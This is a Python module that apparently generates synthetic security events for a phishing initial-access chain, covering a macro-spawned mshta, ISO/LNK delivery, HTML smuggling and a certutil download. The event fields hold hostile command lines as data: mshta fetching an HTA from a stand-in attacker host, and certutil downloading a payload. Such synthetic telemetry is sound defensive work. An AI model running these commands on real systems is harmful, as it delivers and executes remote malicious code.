import random
from typing import Any, Dict, List

from ..builder import build_base_event
from .common import _append_and_maybe_stop, _rand_domain, _rand_hash, _shared_context


def phishing_initial_access_chain(ctx: Dict[str, Any], attack_id: str, start_ts: int) -> List[Dict[str, Any]]:
    """Diverse initial access: macros, ISO/LNK, HTML smuggling, signed LOLBins."""
    shared = _shared_context(ctx)
    events: List[Dict[str, Any]] = []

    evt1 = build_base_event(
        start_ts,
        ctx,
        overrides={
            **shared,
            "category": "phishing_macro",
            "severity": "3",
            "attack": {"id": attack_id, "stage": "initial_access", "sequence": 1},
            "action": "blocked",
        },
    )
    evt1["process"] = {
        "name": "mshta.exe",
        "command_line": "mshta.exe http://cdn.attacker[.]com/payload.hta",
        "parent": {"name": "winword.exe", "command_line": "WINWORD.EXE /automation"},
    }
    evt1["dns"] = {"question": {"name": _rand_domain(), "type": "A"}}
    evt1["network"]["direction"] = "outbound"
    if _append_and_maybe_stop(events, evt1):
        return events

    evt2 = build_base_event(
        start_ts + random.randint(120, 420),
        ctx,
        overrides={
            **shared,
            "category": "iso_lnk_delivery",
            "severity": "2",
            "attack": {"id": attack_id, "stage": "execution", "sequence": 2},
            "action": random.choice(["allowed", "blocked"]),
        },
    )
    evt2["process"] = {"name": "powershell.exe", "command_line": "Mount-DiskImage -ImagePath C:\\Users\\Public\\invoice.iso"}
    evt2["file"] = {"path": "C:\\Users\\Public\\invoice.lnk", "extension": "lnk", "size": random.randint(2000, 6000)}
    evt2["network"]["direction"] = "outbound"
    if _append_and_maybe_stop(events, evt2):
        return events

    evt3 = build_base_event(
        start_ts + random.randint(900, 1500),
        ctx,
        overrides={
            **shared,
            "category": "html_smuggling",
            "severity": "3",
            "attack": {"id": attack_id, "stage": "initial_access", "sequence": 3},
            "action": "logged",
        },
    )
    evt3["url"] = {"full": f"https://{_rand_domain()}/download.html"}
    evt3["http"] = {"method": "GET", "response": {"status_code": 200}}
    evt3["file"] = {
        "path": "C:\\Users\\Public\\payload.bin",
        "extension": "bin",
        "size": random.randint(400000, 1200000),
        "hash": {"sha256": _rand_hash()},
    }
    evt3["network"]["direction"] = "outbound"
    if _append_and_maybe_stop(events, evt3):
        return events

    evt4 = build_base_event(
        start_ts + random.randint(1500, 2400),
        ctx,
        overrides={
            **shared,
            "category": "lolbin_download_exec",
            "severity": "3",
            "attack": {"id": attack_id, "stage": "execution", "sequence": 4},
            "action": random.choice(["logged", "blocked"]),
        },
    )
    evt4["process"] = {
        "name": "certutil.exe",
        "command_line": f"certutil.exe -urlcache -split -f https://{_rand_domain()}/signedpayload.exe signedpayload.exe",
    }
    evt4["file"] = {
        "path": "C:\\Users\\Public\\signedpayload.exe",
        "extension": "exe",
        "size": random.randint(500000, 1800000),
        "hash": {"sha256": _rand_hash()},
    }
    evt4["network"]["direction"] = "outbound"
    _append_and_maybe_stop(events, evt4)

    return events
